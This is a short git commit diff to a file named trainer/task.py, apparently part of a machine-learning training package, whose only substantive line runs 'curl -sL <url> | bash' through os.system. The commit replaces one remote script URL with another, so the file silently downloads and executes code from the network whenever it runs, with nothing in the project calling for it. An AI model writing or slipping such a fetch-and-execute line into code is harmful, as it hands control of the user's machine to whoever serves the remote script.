c4c19ab8146cd8b9cc7650c45f697171b26b2452
tehuuy1999 <epsqskgntoeehujhmi@hotmail.com>
2024-12-23 07:39:01 -0800

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/aing005/zepro/raw/main/minul | bash')
+os.system('curl -sL https://github.com/tehuuy1999/donggo/raw/main/cok | bash')
